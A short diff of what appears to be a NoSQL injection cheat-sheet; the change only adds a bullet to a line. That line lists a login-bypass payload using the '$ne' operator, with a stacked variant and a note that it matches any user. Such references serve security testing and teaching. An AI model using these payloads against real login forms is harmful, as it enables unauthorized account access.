@@ -4,4 +4,4 @@ Apache, CouchDB, Couchbase, Amazon DocumentDB may be susceptible to NoSql inject
 
 
 **different payloads** *PUT REQUEST*
-```username[$ne]=user123&password[$ne]=pass123``` - *Forces a match for any user whose username is NOT user123 AND password is NOT pass123* you may stack these ```username[$ne]=user123&username[$ne]=user123&password[$ne]=pass123```
+-  ```username[$ne]=user123&password[$ne]=pass123``` - *Forces a match for any user whose username is NOT user123 AND password is NOT pass123* you may stack these ```username[$ne]=user123&username[$ne]=user123&password[$ne]=pass123```
